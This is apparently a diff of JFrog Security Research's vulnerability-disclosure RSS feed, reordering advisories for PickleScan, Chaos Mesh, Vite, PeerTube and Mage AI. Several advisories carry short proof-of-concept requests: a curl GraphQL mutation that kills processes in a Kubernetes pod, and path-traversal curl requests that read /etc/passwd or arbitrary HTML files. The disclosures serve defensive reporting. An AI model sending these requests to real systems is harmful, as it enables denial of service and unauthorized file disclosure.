@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Tue, 28 Jul 2026 15:38:51 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 29 Jul 2026 00:38:40 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -1175,6 +1175,56 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
@@ -1225,56 +1275,6 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
-
-## PoC
-
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
-
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
 ]]></content:encoded>
         </item>
         <item>
@@ -1436,59 +1436,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Denial of Service via Unauthorized Access to Chaos Mesh debugging server
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
-
-
-## PoC
-
-```shell
-curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
-
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
@@ -1542,51 +1489,56 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
             <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-Vite arbitrary remote HTML file leak
+Denial of Service via Unauthorized Access to Chaos Mesh debugging server
 
 ## Component
 
-[vite](https://www.npmjs.com/package/vite)
+github.com/chaos-mesh/chaos-mesh
 
 ## Affected versions
 
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
+(,2.7.2]
 
 ## Description
 
-This vulnerability allows a remote attacker to leak any HTML file on the system.
+The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
+
 
 ## PoC
 
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
 ```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
+
 ```
+
+
 
 ## Vulnerability Mitigations
 
-No mitigations are supplied for this vulnerability 
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
 
 
 
 ## References
 
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+
+
 ]]></content:encoded>
         </item>
         <item>
@@ -1658,6 +1610,54 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -2424,6 +2424,93 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32946 Medium severity. PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any attacker to add playlists to a different user’s channel using the ActivityPub protocol.
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. The **createOrUpdateVideoPlaylist** function is in charge of creating the playlist. In it, the **setVideoChannel** function is called to set the video channel that the playlist will belong to:
+
+```js
+async function setVideoChannel (playlistObject: PlaylistObject, playlistAttributes: AttributesOnly<VideoPlaylistModel>) {
+  ...
+
+  const actor = await getOrCreateAPActor(getAPId(playlistObject.attributedTo[0]), 'all')
+
+  ...
+
+  playlistAttributes.videoChannelId = actor.VideoChannel.id
+  playlistAttributes.ownerAccountId = actor.VideoChannel.Account.id
+}
+```
+
+This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
+
+
+
+This code sets the channel ID of the playlist to the channel ID from the **attributedTo** attribute of the Playlist object passed in the Create Activity without checking if the channel is owned by the actor who signed the activity or belongs to the server that the activity came from. It then sets the owner of the playlist to the owner of the channel. This will allow any attacker to create a playlist in any existing channel on the server. The playlist will be owned by the attacked user, thus the attacked user will be able to add and remove videos or change the properties of the playlist, but as long as the attacked user didn’t notice the attack, the playlist will be listed in its channel.
+
+It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there is a channel called **root_channel**, belonging to the root user. For simplifying the PoC, we set the **prevent_ssrf** configuration to **false**, allowing us to create an attacking server easily on the same machine.
+
+
+
+1. Edit the file **malicious_rest_server.py**. There is a commented out line that says “INSERT VIDEO HERE”. Under that line, replace the URL with a url of a valid video on the PeerTube server. You can find one by surfing to [**http://localhost:3000/api/v1/videos**](http://localhost:3000/api/v1/videos) and copying the URL of one of the public videos.
+
+1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
+
+   ```
+   python malicious_rest_server.py
+   ```
+
+   This will start a server listening on port 1234.
+
+1. In another terminal, run the following command (you will need to install the **cryptography** and **requests** packages for python if they are not installed on the system):
+
+   ```
+   python send_inbox_activity.py
+   ```
+
+   This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
+
+1. If everything was configured correctly, a new playlist will be created in **root_channel**, containing one video, and with a picture of a cat as the playlist’s thumbnail.
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
@@ -2554,93 +2641,6 @@ curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Cont
 If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
 
 
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32946 Medium severity. PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to add playlists to a different user’s channel using the ActivityPub protocol.
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. The **createOrUpdateVideoPlaylist** function is in charge of creating the playlist. In it, the **setVideoChannel** function is called to set the video channel that the playlist will belong to:
-
-```js
-async function setVideoChannel (playlistObject: PlaylistObject, playlistAttributes: AttributesOnly<VideoPlaylistModel>) {
-  ...
-
-  const actor = await getOrCreateAPActor(getAPId(playlistObject.attributedTo[0]), 'all')
-
-  ...
-
-  playlistAttributes.videoChannelId = actor.VideoChannel.id
-  playlistAttributes.ownerAccountId = actor.VideoChannel.Account.id
-}
-```
-
-This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
-
-
-
-This code sets the channel ID of the playlist to the channel ID from the **attributedTo** attribute of the Playlist object passed in the Create Activity without checking if the channel is owned by the actor who signed the activity or belongs to the server that the activity came from. It then sets the owner of the playlist to the owner of the channel. This will allow any attacker to create a playlist in any existing channel on the server. The playlist will be owned by the attacked user, thus the attacked user will be able to add and remove videos or change the properties of the playlist, but as long as the attacked user didn’t notice the attack, the playlist will be listed in its channel.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there is a channel called **root_channel**, belonging to the root user. For simplifying the PoC, we set the **prevent_ssrf** configuration to **false**, allowing us to create an attacking server easily on the same machine.
-
-
-
-1. Edit the file **malicious_rest_server.py**. There is a commented out line that says “INSERT VIDEO HERE”. Under that line, replace the URL with a url of a valid video on the PeerTube server. You can find one by surfing to [**http://localhost:3000/api/v1/videos**](http://localhost:3000/api/v1/videos) and copying the URL of one of the public videos.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (you will need to install the **cryptography** and **requests** packages for python if they are not installed on the system):
-
-   ```
-   python send_inbox_activity.py
-   ```
-
-   This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
-
-1. If everything was configured correctly, a new playlist will be created in **root_channel**, containing one video, and with a picture of a cat as the playlist’s thumbnail.
 
 ## Vulnerability Mitigations
 
@@ -3075,6 +3075,43 @@ with -
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI deleted users RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
@@ -3119,6 +3156,49 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI git content request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI pipeline interaction request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</guid>
@@ -3147,86 +3227,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 curl -X GET
 'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
 F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI deleted users RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI git content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
